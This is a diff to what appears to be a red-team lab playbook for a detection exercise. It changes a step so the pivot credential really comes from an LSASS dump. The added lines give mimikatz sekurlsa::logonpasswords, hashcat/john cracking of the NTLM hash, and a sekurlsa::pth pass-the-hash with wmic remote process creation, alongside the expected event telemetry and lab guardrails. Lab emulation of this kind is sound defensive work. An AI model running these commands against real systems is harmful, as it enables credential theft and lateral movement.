@@ -176,15 +176,25 @@ Preconditions (preflight gates):
 > (`[INFERRED-C0015]`, provenance `[UNKNOWN-C0015]`); the lab reproduces the same mechanism self-consistently:
 > **S7 plants the session → S7b harvests it → S8 uses the identity**.
 
-Run (password at the runas prompt only, never on the command line / logs):
+Obtain → use (the pivot credential REALLY comes from the dump):
 ```powershell
 runas /user:C0015\it.admin "C:\Tools\mimikatz.exe sekurlsa::logonpasswords"
 ```
-Guardrails (lab boundary, recorded in `docs/attack-chain-plan.md` §10):
-- The dump/console output **stays on the VM**: no `lsass.dmp`/output file written to disk, nothing copied into the
-  repo, ledger, logs or this playbook; close the window after the run.
-- The WMI identity at S8 remains the operator-provided prompt (the lab's own provisioned password) — the harvested
-  values are never consumed or stored outside the run.
+1. In the console output, copy it.admin's line — it carries the **NTLM hash** (no plaintext on modern Windows,
+   WDigest off).
+2. Crack it on the attacker host (Kali): `echo -n '<NTLM>' > /tmp/it.ntlm && hashcat -m 1000 /tmp/it.ntlm
+   rockyou.txt --show` (or `john --format=nt /tmp/it.ntlm`); `rm -f /tmp/it.ntlm` after use.
+3. Use the **cracked plaintext** at the S8 runas/wmic prompt — flow: `lsass dump → NTLM → crack → use`.
+
+Alternative (no crack needed): Pass-the-Hash on WS01 — `sekurlsa::pth /user:it.admin /domain:c0015.lab
+/ntlm:<NTLM> "cmd /c wmic /node:FS01 process call create ..."` — telemetry changes (no S4648; FS01 4624 comes
+from the forged logon session); record the variant.
+
+Guardrails (lab boundary, `docs/attack-chain-plan.md` §10):
+- The dump output, NTLM hash and cracked plaintext are consumed **in-run only**; they live in operator memory or
+  transient attacker-host files that are deleted; never written to the repo, ledger, c2sim log or this playbook;
+  the runas windows are closed after use.
+- `payloads/lsass/c0015_mimikatz_surrogate.c` remains the fallback when the real tool cannot be deployed.
 
 Evidence: WS01 **S4648** (explicit credential), **E1 `mimikatz.exe`** (parent = `cmd.exe` via runas),
 **E10 ProcessAccess target `lsass.exe`** (real high GrantedAccess from the elevated token), output in the runas
